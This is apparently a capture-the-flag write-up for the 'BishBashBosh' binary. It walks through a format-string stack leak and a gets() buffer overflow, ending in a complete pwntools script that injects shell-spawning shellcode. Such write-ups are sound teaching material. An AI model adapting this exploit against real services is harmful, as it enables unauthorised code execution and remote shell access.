# BishBashBosh Solution

First you should notice that using checksec you can see that the binary has NX disabled and Stack is Executable.

This hints that Shellcode is possible.

`$ checksec chal`


Next you should notice that a simple buffer overflow exploit can be performed as the `gets()` function is used without a buffer limit.

Username:
`gets(username);`
Password:
`gets(passwd);`


Now there is a few ways of solving this part of the challenge depending on whether ASLR is Enabled.
This solution will cover the case that ASLR is enabled.

We can notice that a FSB can be used to leak the address of stack memory using the whoami command

```
if (strcmp(command, "whoami") == 0) {
    whoami(bp);
}
```



We can leak the `rbp` of `main()` which is then used to calculate the address of `bp.init_password`

`p.sendlineafter("> ", "%6$p")`

We can use objdump to find the offset to apply to find the address.
`$ objdump -d chal`

```
40143a:       e8 b1 fc ff ff          call   4010f0 <printf@plt>
40143f:       48 8d 85 30 ff ff ff    lea    -0xd0(%rbp),%rax
401446:       48 89 c7                mov    %rax,%rdi
401449:       b8 00 00 00 00          mov    $0x0,%eax
```

This is important as shellcode requires a function pointer for it to be called.
With this address we can chain it with shell code generated by pwntools to make the exploit.

Final Exploit:

```
from pwn import *

context.arch = 'amd64'
context.binary = 'chal'
context.log_level = 'debug'

#p = process('./chal')
p = remote('localhost', 1337)

sh = asm(shellcraft.sh()) # Shell Code
print(shellcraft.sh())

p.sendlineafter("> ", "%6$p") # FSB To leak stack
print(p.recvuntil("> "))
p.sendline("")
p.recvuntil("> ")

p.sendline("whoami")

leak = p.recvuntil("> ").decode().rstrip("> ")
print("leak", leak)

p.sendline("exit") # Exit to return to start of main
leaked_addr = int(leak, 16)
username_addr = leaked_addr - 0xd0 # Found from objdump
payload2 = sh
payload2 += b"\x90" * (192 - len(sh))
payload2 += p64(username_addr)

p.recvuntil("> ")
p.sendline(payload2)
p.recvuntil("> ")
p.sendline("")

p.interactive()
```
